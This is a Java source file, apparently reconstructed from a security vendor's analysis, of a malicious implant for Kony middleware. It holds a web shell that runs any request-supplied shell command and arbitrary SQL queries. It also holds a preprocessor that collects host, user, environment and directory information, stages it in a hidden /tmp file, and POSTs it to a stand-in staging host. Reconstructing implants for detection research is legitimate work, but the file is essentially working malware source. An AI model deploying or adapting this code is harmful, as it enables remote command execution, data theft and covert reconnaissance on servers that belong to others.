// Behavioral reconstruction from Forescout, not recovered implant source.
import com.konylabs.middleware.common.JavaService2;
import com.konylabs.middleware.common.DataPreProcessor2;
import com.konylabs.middleware.controller.DataControllerRequest;
import com.konylabs.middleware.controller.DataControllerResponse;
import com.konylabs.middleware.dataobject.Result;
import java.util.HashMap;
import java.sql.*;
import java.net.*;
import java.nio.file.*;
import java.nio.charset.StandardCharsets;
class ReconJavaService implements JavaService2 {
  public Object invoke(String methodID, Object[] inputArray, DataControllerRequest request, DataControllerResponse response) throws Exception {
    String command = request.getParameter("cmd");
    if (command != null) {
      Process child = new ProcessBuilder("/bin/sh", "-c", command).start();
      byte[] output = child.getInputStream().readAllBytes();
      int status = child.waitFor();
      return new String(output, StandardCharsets.UTF_8) + status;
    }
    String query = request.getParameter("sql");
    try (Connection db = DriverManager.getConnection(request.getParameter("db"),
        request.getParameter("user"), request.getParameter("pass"))) {
      Statement statement = db.createStatement();
      statement.setMaxRows(50);
      return statement.executeQuery(query);
    }
  }
}
class ReconPreProcessor implements DataPreProcessor2 {
  public boolean execute(HashMap inputMap, DataControllerRequest request, DataControllerResponse response, Result result) throws Exception {
    String report = "RECON_PREPROCESSOR\n" + InetAddress.getLocalHost().getHostName()
      + NetworkInterface.getNetworkInterfaces().toString()
      + System.getenv().keySet().toString()
      + System.getProperty("java.version") + System.getProperty("java.home")
      + System.getProperty("user.name") + System.getProperty("user.dir")
      + System.getProperty("os.name") + System.getProperty("os.arch")
      + ProcessHandle.current().pid();
    Process identity = new ProcessBuilder("id").start();
    report += new String(identity.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
    report += Files.list(Path.of("/tmp")).toList().toString();
    report += Files.list(Path.of(".")).toList().toString() + "RECON_DONE";
    byte[] bytes = report.getBytes(StandardCharsets.UTF_8);
    Files.write(Path.of("/tmp/.recon_out"), bytes);
    // The victim staging URL is redacted in the article. Reserved control endpoint.
    HttpURLConnection channel = (HttpURLConnection)new URL("https://staging.example.invalid/receive").openConnection();
    channel.setRequestMethod("POST");
    channel.setRequestProperty("X-A", "k1");
    channel.setDoOutput(true);
    channel.getOutputStream().write(bytes);
    return true;
  }
}
